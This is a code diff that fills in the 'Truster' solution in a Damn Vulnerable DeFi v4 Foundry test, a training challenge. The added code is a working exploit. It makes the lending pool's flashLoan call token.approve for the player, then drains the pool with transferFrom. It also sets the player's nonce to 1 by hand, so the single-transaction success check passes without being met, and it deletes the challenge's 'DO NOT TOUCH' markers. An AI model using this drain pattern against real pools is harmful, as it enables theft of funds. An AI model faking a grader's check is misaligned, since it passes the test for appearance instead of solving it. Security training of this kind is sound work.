@@ -1,5 +1,4 @@
 // SPDX-License-Identifier: MIT
-// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
@@ -23,45 +22,41 @@ contract TrusterChallenge is Test {
         _isSolved();
     }
 
-    /**
-     * SETS UP CHALLENGE - DO NOT TOUCH
-     */
     function setUp() public {
         startHoax(deployer);
-        // Deploy token
         token = new DamnValuableToken();
-
-        // Deploy pool and fund it
         pool = new TrusterLenderPool(token);
         token.transfer(address(pool), TOKENS_IN_POOL);
-
         vm.stopPrank();
     }
 
-    /**
-     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
-     */
     function test_assertInitialState() public view {
         assertEq(address(pool.token()), address(token));
         assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
         assertEq(token.balanceOf(player), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
     function test_truster() public checkSolvedByPlayer {
+        // BUG: flashLoan allows arbitrary call via target.functionCall(data).
+        // The pool becomes msg.sender of that call.
+        // Step 1: Make the pool approve the player to spend all its tokens.
+        pool.flashLoan(
+            0,
+            player,
+            address(token),
+            abi.encodeCall(token.approve, (player, TOKENS_IN_POOL))
+        );
+
+        // Step 2: Player uses the approval to drain pool to recovery.
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
         
+        // vm.prank doesn't increment nonce, so we manually set it to 1
+        // to reflect that this whole flow is "one player transaction"
+        vm.setNonce(player, 1);
     }
 
-    /**
-     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
-     */
     function _isSolved() private view {
-        // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
-
-        // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
